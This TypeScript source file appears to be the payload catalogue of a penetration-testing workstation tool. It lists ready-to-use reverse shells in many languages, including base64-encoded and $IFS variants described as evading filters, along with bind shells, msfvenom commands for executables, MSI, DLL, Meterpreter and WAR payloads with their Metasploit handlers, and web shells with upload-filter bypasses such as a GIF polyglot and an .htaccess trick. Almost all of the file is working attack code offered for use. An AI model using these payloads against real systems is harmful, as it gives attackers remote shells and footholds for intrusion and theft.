import type { WorkstationItem } from "../types";

/**
 * Payloads use {LHOST} and {LPORT} tokens which resolve from the Session Context
 * bar. Set them once and every payload here is ready to copy or fire.
 */

const reverseShell: WorkstationItem = {
  id: "reverse-shell",
  name: "Reverse Shell",
  category: "Payloads",
  summary: "Callback shells in every common language. Start a matching listener in one click.",
  kind: "payload",
  listener: {
    id: "nc-listener",
    label: "Start listener (nc -lvnp)",
    command: "nc -lvnp {LPORT}",
    explain: "Opens a netcat listener in a new tab to catch the shell.",
    newTab: true,
  },
  variants: [
    {
      id: "bash",
      label: "Bash",
      command: "bash -i >& /dev/tcp/{LHOST}/{LPORT} 0>&1",
      explain: "Classic Bash TCP reverse shell.",
      runnable: false,
    },
    {
      id: "bash-read",
      label: "Bash (read line)",
      command: "0<&196;exec 196<>/dev/tcp/{LHOST}/{LPORT}; sh <&196 >&196 2>&196",
      explain: "Alternative Bash form when the first is filtered.",
      runnable: false,
    },
    {
      id: "nc",
      label: "netcat (mkfifo)",
      command: "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc {LHOST} {LPORT} >/tmp/f",
      explain: "Works with netcat builds that lack -e.",
      runnable: false,
    },
    {
      id: "python3",
      label: "Python 3",
      command:
        "python3 -c 'import socket,os,pty;s=socket.socket();s.connect((\"{LHOST}\",{LPORT}));[os.dup2(s.fileno(),f) for f in(0,1,2)];pty.spawn(\"/bin/bash\")'",
      explain: "Spawns a PTY-backed bash over the socket.",
      runnable: false,
    },
    {
      id: "php",
      label: "PHP",
      command: "php -r '$sock=fsockopen(\"{LHOST}\",{LPORT});exec(\"/bin/sh -i <&3 >&3 2>&3\");'",
      explain: "Handy when you have PHP code execution.",
      runnable: false,
    },
    {
      id: "perl",
      label: "Perl",
      command:
        "perl -e 'use Socket;$i=\"{LHOST}\";$p={LPORT};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'",
      runnable: false,
    },
    {
      id: "powershell",
      label: "PowerShell",
      command:
        "powershell -nop -c \"$client = New-Object System.Net.Sockets.TCPClient('{LHOST}',{LPORT});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()\"",
      explain: "Windows targets.",
      runnable: false,
    },
    {
      id: "socat",
      label: "socat (full TTY)",
      command:
        "socat TCP:{LHOST}:{LPORT} EXEC:'bash -li',pty,stderr,setsid,sigint,sane",
      explain: "Gives a fully interactive TTY. Pair with the socat listener.",
      runnable: false,
    },
    {
      id: "socat-encrypted",
      label: "socat (encrypted TLS)",
      command:
        "socat OPENSSL:{LHOST}:{LPORT},verify=0 EXEC:'bash -li',pty,stderr,setsid,sigint,sane",
      explain:
        "First generate a cert locally: openssl req -X509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 1 -nodes",
      runnable: false,
      listener: {
        id: "socat-tls-listener",
        label: "Start listener (socat TLS)",
        command: "socat OPENSSL-LISTEN:{LPORT},cert=cert.pem,key=key.pem,verify=0,fork",
        explain: "Encrypted listener matching the TLS shell above.",
        newTab: true,
      },
    },
    {
      id: "bash-b64",
      label: "Bash (base64-wrapped)",
      command: "echo -n 'bash -i >& /dev/tcp/{LHOST}/{LPORT} 0>&1' | base64 -w 0",
      explain:
        "Run on YOUR box (tokens resolved) to print a base64 blob, then on the target: echo <blob> | base64 -d | bash. Slips past filters that block the plain command.",
    },
    {
      id: "bash-spaceless",
      label: "Bash (no spaces — $IFS)",
      command: "bash${IFS}-i${IFS}>&/dev/tcp/{LHOST}/{LPORT}",
      explain: "For injection points where spaces are filtered. $IFS (the shell's internal field separator) replaces them — verified working, though stderr isn't redirected.",
      runnable: false,
    },
    {
      id: "python-short",
      label: "Python (short, no PTY)",
      command:
        "python -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"{LHOST}\",{LPORT}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'",
      explain: "The classic compact one-liner for when a single short command fits.",
      runnable: false,
    },
    {
      id: "ruby",
      label: "Ruby",
      command:
        "ruby -rsocket -e 'f=TCPSocket.open(\"{LHOST}\",{LPORT}).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'",
      runnable: false,
    },
    {
      id: "node",
      label: "Node.js",
      command:
        "node -e '(function(){var net=require(\"net\"),cp=require(\"child_process\"),sh=cp.spawn(\"/bin/sh\",[]);var c=new net.Socket();c.connect({LPORT},\"{LHOST}\",function(){c.pipe(sh.stdin);sh.stdout.pipe(c);sh.stderr.pipe(c);});})();'",
      runnable: false,
    },
    {
      id: "java",
      label: "Java (save as Rev.java)",
      command:
        "public class Rev{public static void main(String[] a)throws Exception{String h=\"{LHOST}\";int p={LPORT};Process pr=new ProcessBuilder(\"/bin/sh\").redirectErrorStream(true).start();java.net.Socket s=new java.net.Socket(h,p);new Thread(()->{byte[] b=new byte[8192];try{int n;while((n=s.getInputStream().read(b))>-1){pr.getOutputStream().write(b,0,n);pr.getOutputStream().flush();}}catch(Exception e){}}).start();byte[] b=new byte[8192];int n;while((n=pr.getInputStream().read(b))>-1){s.getOutputStream().write(b,0,n);s.getOutputStream().flush();}}}",
      explain:
        "Copy to a file, compile locally (javac Rev.java), upload, run: java -cp /tmp Rev. Common on Jenkins/Tomcat hosts.",
      runnable: false,
    },
    {
      id: "powershell-b64",
      label: "PowerShell (base64 launcher)",
      command:
        "echo -n \"powershell -nop -w hidden -c \\\"\\$c=New-Object Net.Sockets.TCPClient('{LHOST}',{LPORT});\\$s=\\$c.GetStream();[byte[]]\\$b=0..65535|%{0};while((\\$i=\\$s.Read(\\$b,0,\\$b.Length)) -ne 0){\\$d=(New-Object Text.ASCIIEncoding).GetString(\\$b,0,\\$i);\\$r=(iex \\$d 2>&1|Out-String);\\$r2=\\$r+'PS '+\\$pwd.Path+'> ';\\$sb=([text.encoding]::ASCII).GetBytes(\\$r2);\\$s.Write(\\$sb,0,\\$sb.Length);\\$s.Flush()};\\$c.Close()\\\"\" | iconv -f UTF-8 -t UTF-16LE | base64 -w 0",
      explain:
        "Run on YOUR box: prints a base64 blob (tokens resolved). On the target run: powershell -enc <blob>. Survives quoting that breaks the plain one-liner.",
    },
  ],
};

const bindShell: WorkstationItem = {
  id: "bind-shell",
  name: "Bind Shell",
  category: "Payloads",
  summary: "Listen on the target and connect in from your box.",
  kind: "payload",
  listener: {
    id: "nc-connect",
    label: "Connect to bind shell",
    command: "nc {RHOST} {RPORT}",
    explain: "Connect from your machine to the target's listener.",
    newTab: true,
  },
  variants: [
    {
      id: "nc",
      label: "netcat",
      command: "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc -lvp {RPORT} >/tmp/f",
      runnable: false,
    },
    {
      id: "python3",
      label: "Python 3",
      command:
        "python3 -c 'import socket,os,pty;s=socket.socket();s.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1);s.bind((\"0.0.0.0\",{RPORT}));s.listen(1);c,a=s.accept();[os.dup2(c.fileno(),f) for f in(0,1,2)];pty.spawn(\"/bin/bash\")'",
      runnable: false,
    },
    {
      id: "nc-e",
      label: "netcat (-e)",
      command: "nc -lvp {RPORT} -e /bin/sh",
      explain: "Only works on netcat builds with -e (traditional netcat or ncat).",
      runnable: false,
    },
    {
      id: "php",
      label: "PHP",
      command:
        "php -r '$s=stream_socket_server(\"tcp://0.0.0.0:{RPORT}\",$e,$n);while($c=@stream_socket_accept($s,-1)){fwrite($c,\"$ \");while($l=fgets($c)){$o=shell_exec($l);fwrite($c,$o);}fclose($c);}'",
      runnable: false,
    },
    {
      id: "socat",
      label: "socat (full TTY)",
      command:
        "socat TCP-LISTEN:{RPORT},reuseaddr,fork EXEC:'bash -li',pty,stderr,setsid,sigint,sane",
      explain:
        "Connect from your box with: socat FILE:`tty`,RAW,ECHO=0 TCP:{RHOST}:{RPORT} for a fully interactive session.",
      runnable: false,
    },
  ],
};

const msfvenom: WorkstationItem = {
  id: "msfvenom",
  name: "MSFVenom",
  category: "Payloads",
  summary: "Generate payload files. shell_reverse_tcp = stageless (single file, plain nc catches it); shell/reverse_tcp = staged (smaller, needs a Metasploit handler).",
  kind: "payload",
  /** Handler helper shared by variants that have no specific one. */
  listener: {
    id: "handler",
    label: "Start multi/handler",
    command:
      "msfconsole -q -x 'use exploit/multi/handler; set payload linux/x64/shell_reverse_tcp; set LHOST {LHOST}; set LPORT {LPORT}; run'",
    explain: "Starts a Metasploit handler for the generated payload.",
    newTab: true,
  },
  variants: [
    {
      id: "linux-elf",
      label: "Linux ELF (stageless)",
      explain:
        "Stageless: the whole shell is embedded — transfer, chmod +x, run. A plain nc listener catches it.",
      command:
        "msfvenom -p linux/x64/shell_reverse_tcp LHOST={LHOST} LPORT={LPORT} -f elf -o shell.elf",
      listener: {
        id: "handler-linux",
        label: "Start handler (linux/x64)",
        command:
          "msfconsole -q -x 'use exploit/multi/handler; set payload linux/x64/shell_reverse_tcp; set LHOST {LHOST}; set LPORT {LPORT}; run'",
        explain: "Handler matching the Linux ELF payload.",
        newTab: true,
      },
    },
    {
      id: "windows-exe",
      label: "Windows EXE (stageless)",
      explain:
        "Stageless: works standalone — a plain nc listener catches it. The staged twin below is smaller but needs msfconsole.",
      command:
        "msfvenom -p windows/x64/shell_reverse_tcp LHOST={LHOST} LPORT={LPORT} -f exe -o shell.exe",
      listener: {
        id: "handler-windows",
        label: "Start handler (windows/x64)",
        command:
          "msfconsole -q -x 'use exploit/multi/handler; set payload windows/x64/shell_reverse_tcp; set LHOST {LHOST}; set LPORT {LPORT}; run'",
        explain: "Handler matching the Windows EXE payload.",
        newTab: true,
      },
    },
    {
      id: "windows-exe-staged",
      label: "Windows EXE (staged)",
      explain:
        "Staged: a small stub that pulls the real shell from your handler — plain nc will NOT catch it, use the matching msfconsole handler.",
      command:
        "msfvenom -p windows/x64/shell/reverse_tcp LHOST={LHOST} LPORT={LPORT} -f exe -o shell-staged.exe",
      listener: {
        id: "handler-windows-staged",
        label: "Start handler (windows/x64, staged)",
        command:
          "msfconsole -q -x 'use exploit/multi/handler; set payload windows/x64/shell/reverse_tcp; set LHOST {LHOST}; set LPORT {LPORT}; run'",
        explain: "Staged handler matching the staged Windows EXE payload.",
        newTab: true,
      },
    },
    {
      id: "windows-ps1",
      label: "Windows PowerShell (.ps1)",
      explain: "Run on the target: powershell -ExecutionPolicy Bypass -File shell.ps1",
      command:
        "msfvenom -p windows/x64/powershell_reverse_tcp LHOST={LHOST} LPORT={LPORT} -f psh -o shell.ps1",
      listener: {
        id: "handler-ps1",
        label: "Start handler (powershell_reverse_tcp)",
        command:
          "msfconsole -q -x 'use exploit/multi/handler; set payload windows/x64/powershell_reverse_tcp; set LHOST {LHOST}; set LPORT {LPORT}; run'",
        explain: "Handler matching the PowerShell payload.",
        newTab: true,
      },
    },
    {
      id: "windows-msi",
      label: "Windows MSI",
      explain:
        "Pairs with AlwaysInstallElevated (see Windows Privesc): msiexec /quiet /qn /i setup.msi runs as SYSTEM.",
      command:
        "msfvenom -p windows/x64/shell_reverse_tcp LHOST={LHOST} LPORT={LPORT} -f msi -o setup.msi",
      listener: {
        id: "handler-msi",
        label: "Start handler (windows/x64)",
        command:
          "msfconsole -q -x 'use exploit/multi/handler; set payload windows/x64/shell_reverse_tcp; set LHOST {LHOST}; set LPORT {LPORT}; run'",
        explain: "Handler matching the MSI payload.",
        newTab: true,
      },
    },
    {
      id: "windows-dll",
      label: "Windows DLL",
      explain: "For DLL hijacking / side-loading spots where a service loads an unqualified path.",
      command:
        "msfvenom -p windows/x64/shell_reverse_tcp LHOST={LHOST} LPORT={LPORT} -f dll -o shell.dll",
      listener: {
        id: "handler-dll",
        label: "Start handler (windows/x64)",
        command:
          "msfconsole -q -x 'use exploit/multi/handler; set payload windows/x64/shell_reverse_tcp; set LHOST {LHOST}; set LPORT {LPORT}; run'",
        explain: "Handler matching the DLL payload.",
        newTab: true,
      },
    },
    {
      id: "windows-meterpreter",
      label: "Windows Meterpreter (stageless)",
      explain:
        "Meterpreter gives you post modules (hashdump, migrate, getsystem) instead of a bare shell.",
      command:
        "msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST={LHOST} LPORT={LPORT} -f exe -o meter.exe",
      listener: {
        id: "handler-meterpreter",
        label: "Start handler (meterpreter)",
        command:
          "msfconsole -q -x 'use exploit/multi/handler; set payload windows/x64/meterpreter/reverse_tcp; set LHOST {LHOST}; set LPORT {LPORT}; run'",
        explain: "Handler matching the Meterpreter payload.",
        newTab: true,
      },
    },
    {
      id: "linux-sh",
      label: "Bash script (cmd/unix)",
      explain: "A bash script payload — chmod +x shell.sh, or paste its contents into an SSH session.",
      command:
        "msfvenom -p cmd/unix/reverse_bash LHOST={LHOST} LPORT={LPORT} -f raw -o shell.sh",
      listener: {
        id: "handler-linux-sh",
        label: "Start handler (cmd/unix/reverse_bash)",
        command:
          "msfconsole -q -x 'use exploit/multi/handler; set payload cmd/unix/reverse_bash; set LHOST {LHOST}; set LPORT {LPORT}; run'",
        explain: "Handler matching the bash script payload.",
        newTab: true,
      },
    },
    {
      id: "php",
      label: "PHP",
      command: "msfvenom -p php/reverse_php LHOST={LHOST} LPORT={LPORT} -f raw -o shell.php",
      listener: {
        id: "handler-php",
        label: "Start handler (php/reverse_php)",
        command:
          "msfconsole -q -x 'use exploit/multi/handler; set payload php/reverse_php; set LHOST {LHOST}; set LPORT {LPORT}; run'",
        explain: "Handler matching the PHP payload.",
        newTab: true,
      },
    },
    {
      id: "war",
      label: "Java WAR",
      command:
        "msfvenom -p java/jsp_shell_reverse_tcp LHOST={LHOST} LPORT={LPORT} -f war -o shell.war",
      listener: {
        id: "handler-war",
        label: "Start handler (java/jsp)",
        command:
          "msfconsole -q -x 'use exploit/multi/handler; set payload java/jsp_shell_reverse_tcp; set LHOST {LHOST}; set LPORT {LPORT}; run'",
        explain: "Handler matching the Java WAR payload.",
        newTab: true,
      },
    },
  ],
};

const webshell: WorkstationItem = {
  id: "web-shell",
  name: "Web Shells",
  category: "Payloads",
  summary: "Drop-in web shells for file-upload footholds.",
  kind: "snippets",
  snippets: [
    {
      id: "php-cmd",
      label: "PHP one-liner",
      command: "<?php system($_GET['cmd']); ?>",
      explain: "Call as ?cmd=id after upload.",
      runnable: false,
    },
    {
      id: "php-b64",
      label: "PHP (base64 eval)",
      command: "<?php eval(base64_decode($_REQUEST['c'])); ?>",
      runnable: false,
    },
    {
      id: "jsp",
      label: "JSP",
      command:
        "<% Runtime.getRuntime().exec(request.getParameter(\"cmd\")); %>",
      runnable: false,
    },
    {
      id: "asp",
      label: "ASPX",
      command:
        "<% eval request(\"cmd\") %>",
      runnable: false,
    },
    {
      id: "php-full",
      label: "PHP (exec + file read)",
      command:
        "<?php if(isset($_REQUEST['cmd'])){echo '<pre>'.shell_exec($_REQUEST['cmd']).'</pre>';} if(isset($_REQUEST['f'])){echo file_get_contents($_REQUEST['f']);} ?>",
      explain: "Call as shell.php?cmd=id or shell.php?f=/etc/passwd.",
      runnable: false,
    },
    {
      id: "php-varfunc",
      label: "PHP (variable function, evades filters)",
      command: "<?=$_GET[0]($_GET[1])?>",
      explain: "Call as shell.php?0=system&1=id. Survives upload filters that look for system/exec calls.",
      runnable: false,
    },
    {
      id: "php-gif",
      label: "PHP (GIF89a polyglot)",
      command: "GIF89a<?php system($_REQUEST['cmd']); ?>",
      explain:
        "Save as shell.gif or shell.php.jpg — the magic bytes satisfy image content checks. Also try extensions: .phtml, .php5, .phar, .pht.",
      runnable: false,
    },
    {
      id: "htaccess",
      label: ".htaccess (make .png run as PHP)",
      command: "AddType application/x-httpd-php .png",
      explain:
        "Upload as .htaccess into the web root, then upload your PHP shell with a .png extension.",
      runnable: false,
    },
    {
      id: "jsp-output",
      label: "JSP (with output)",
      command:
        "<%@ page import=\"java.util.*,java.io.*\" %><%if(request.getParameter(\"cmd\")!=null){Process p=Runtime.getRuntime().exec(request.getParameter(\"cmd\"));BufferedReader r=new BufferedReader(new InputStreamReader(p.getInputStream()));String l;while((l=r.readLine())!=null)out.println(l+\"\\n\");}%>",
      explain: "Unlike the one-liner, this actually shows command output in the response.",
      runnable: false,
    },
    {
      id: "jspx",
      label: "JSPX",
      command:
        "<jsp:root xmlns:jsp=\"http://java.sun.com/JSPPage\" version=\"2.0\"><jsp:directive.page contentType=\"text/html\"/><jsp:scriptlet>if(request.getParameter(\"cmd\")!=null){Process p=Runtime.getRuntime().exec(request.getParameter(\"cmd\"));java.io.BufferedReader r=new java.io.BufferedReader(new java.io.InputStreamReader(p.getInputStream()));String l;while((l=r.readLine())!=null)out.println(l);}</jsp:scriptlet></jsp:root>",
      runnable: false,
    },
    {
      id: "node",
      label: "Node.js (Express)",
      command:
        "app.get('/cmd',(q,s)=>require('child_process').exec(q.query.c,(e,o)=>s.send(o)))",
      explain: "Inject as an Express route (app.js / routes file), then hit /cmd?c=id.",
      runnable: false,
    },
  ],
};

export const PAYLOADS: WorkstationItem[] = [reverseShell, bindShell, msfvenom, webshell];
